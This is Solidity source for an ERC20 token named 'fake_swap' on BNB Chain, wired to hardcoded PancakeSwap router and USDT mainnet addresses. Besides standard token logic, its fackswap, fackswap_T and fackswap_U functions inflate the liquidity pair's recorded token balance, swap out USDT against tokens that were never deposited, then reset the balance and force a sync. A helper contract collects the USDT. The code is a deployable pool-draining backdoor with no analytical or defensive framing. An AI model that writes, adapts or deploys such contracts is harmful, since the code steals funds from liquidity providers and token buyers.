// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";

contract fake_swap is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    U_STORAGE public THIS_U;
    constructor() {
        _name = "fake_swap";
        _symbol = "fake_swap";
        set_info();
        _mint(msg.sender,10**30);
        THIS_U = new U_STORAGE();
        approve(_router,totalSupply());
    }
    // 主要配对合约
    address  main_pair;
    address _router;
    address _usdt;
    address _bnb;
    // 地址预测
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint160(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'   // BNB
            // hex'0ab1c22732234a358b1b7f5502e426dd5324047600eeee39766a5afed9b8f841'//test
        )))));
    }
    function set_info() private{
        _router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
        _usdt= 0x55d398326f99059fF775485246999027B3197955;
        _bnb= 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        main_pair = pairFor(IPancakeRouter(_router).factory(),address(this),_usdt);
    }
    // function set_info() private{
    //     _router=0x7002994Ade218D1EC9BfCfA7ACf9C46eA042156E;
    //     _usdt= 0x99833E039b6F64c6Df32D8f3563d6FAbe77A03a4;
    //     _bnb= 0x7f7111bD3fEc0433b70339649583A45De57B7251;
    //     main_pair = pairFor(IPancakeRouter(_router).factory(),address(this),_usdt);
    // }

    function fackswap(uint256 amount)public{
        uint256 T_start = _balances[main_pair];
        address token0 = IPancakePair(main_pair).token0();

        uint amountOut = IPancakeRouter(_router).getAmountOut(amount,_balances[main_pair],IERC20(_usdt).balanceOf(main_pair));
        (uint amount0Out, uint amount1Out) = address(this) == token0 ? (uint(0), amountOut) : (amountOut, uint(0));
        _balances[main_pair]+=amount;
        IPancakePair(main_pair).swap(amount0Out, amount1Out, address(THIS_U), new bytes(0));

        THIS_U.get_usdt(_usdt);

        uint256 now_U = amountOut;
        amountOut = IPancakeRouter(_router).getAmountOut(now_U,IERC20(_usdt).balanceOf(main_pair),_balances[main_pair]);
        ( amount0Out,  amount1Out) = address(this) != token0 ? (uint(0), amountOut) : (amountOut, uint(0));
        IERC20(_usdt).transfer(main_pair,now_U);
        IPancakePair(main_pair).swap(amount0Out, amount1Out, address(THIS_U), new bytes(0));
        THIS_U.get_usdt(address(this));

        _balances[main_pair]=T_start;
        IPancakePair(main_pair).sync();
    }
    function fackswap_T(uint256 amount)public{
        uint256 T_start = _balances[main_pair];
        address token0 = IPancakePair(main_pair).token0();
        uint amountOut = IPancakeRouter(_router).getAmountOut(amount,_balances[main_pair],IERC20(_usdt).balanceOf(main_pair));
        (uint amount0Out, uint amount1Out) = address(this) == token0 ? (uint(0), amountOut) : (amountOut, uint(0));
        _balances[main_pair]+=amount;
        IPancakePair(main_pair).swap(amount0Out, amount1Out, address(THIS_U), new bytes(0));
        THIS_U.get_usdt(_usdt);
        IERC20(_usdt).transfer(main_pair,amountOut);
        _balances[main_pair]=T_start;
        IPancakePair(main_pair).sync();
    }
    function fackswap_U(uint256 amount)public{
        uint256 T_start = _balances[main_pair];
        address token0 = IPancakePair(main_pair).token0();
        uint amountOut = IPancakeRouter(_router).getAmountOut(amount,IERC20(_usdt).balanceOf(main_pair),_balances[main_pair]);
        (uint amount0Out, uint amount1Out) = address(this) != token0 ? (uint(0), amountOut) : (amountOut, uint(0));
        IERC20(_usdt).transferFrom(msg.sender,main_pair,amount);
        IPancakePair(main_pair).swap(amount0Out, amount1Out, address(THIS_U), new bytes(0));
        _balances[address(THIS_U)]=0;

        uint amountin = IPancakeRouter(_router).getAmountIn(amount,_balances[main_pair],IERC20(_usdt).balanceOf(main_pair));
        ( amount0Out,  amount1Out) = address(this) == token0 ? (uint(0), amount) : (amount, uint(0));
        _balances[main_pair]+=amountin;
        IPancakePair(main_pair).swap(amount0Out, amount1Out,msg.sender, new bytes(0));
        _balances[main_pair]=T_start;
        IPancakePair(main_pair).sync();
    }

}

interface IPancakeRouter {
    function factory() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}
interface IPancakePair{
    function token0() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract U_STORAGE{
    function get_usdt(address token)public{
        IERC20(token).transfer(msg.sender,IERC20(token).balanceOf(address(this)));
    }
}
contract test{
    function change_p(address token,address main_pair,uint256 amount)public{
        IERC20(token).transferFrom(msg.sender,main_pair,amount);
        IPancakePair(main_pair).sync();
    }
}